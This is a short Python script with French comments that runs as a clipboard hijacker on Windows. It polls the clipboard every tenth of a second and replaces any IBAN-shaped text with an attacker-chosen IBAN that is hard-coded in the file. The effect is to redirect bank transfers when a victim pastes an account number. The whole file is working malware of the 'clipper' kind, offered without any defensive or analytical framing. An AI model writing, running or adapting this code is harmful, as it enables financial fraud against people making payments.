import win32clipboard
import time
import re

# IBAN que vous souhaitez utiliser pour remplacer l'IBAN copié
nouvel_iban = "FR7630006000011234567890189"

def valider_iban(iban):
    iban = iban.replace(' ', '').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', iban):
        return False

    # Déplacer les 4 premiers caractères à la fin
    iban = iban[4:] + iban[:4]

    # Convertir les lettres en chiffres (A=10, B=11, ..., Z=35)
    digits = ''
    for char in iban:
        if char.isdigit():
            digits += char
        else:
            digits += str(10 + ord(char) - ord('A'))

    # Calculer le checksum MOD-97
    try:
        checksum = int(digits) % 97
        return checksum == 1
    except ValueError:
        return False

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        except:
            try:
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT).decode('utf-8', errors='ignore')
            except:
                data = None
        win32clipboard.CloseClipboard()
        return data
    except:
        return None

def set_clipboard(text):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardData(win32clipboard.CF_UNICODETEXT, text)
        win32clipboard.CloseClipboard()
    except:
        win32clipboard.CloseClipboard()

def clean_iban(iban):
    if iban is None:
        return None
    return iban.replace(' ', '').replace('\r', '').replace('\n', '').upper()

previous = None
print("Surveillance du presse-papiers activée. Appuyez sur Ctrl+C pour arrêter.")
while True:
    current = get_clipboard()
    clean_current = clean_iban(current)
    if clean_current != previous:
        print(f"Presse-papiers changé vers : {repr(current)}")
        if clean_current and re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', clean_current) and clean_current != nouvel_iban:
            set_clipboard(nouvel_iban)
            print(f"IBAN remplacé par : {nouvel_iban}")
            previous = nouvel_iban
        else:
            previous = clean_current
    time.sleep(0.1)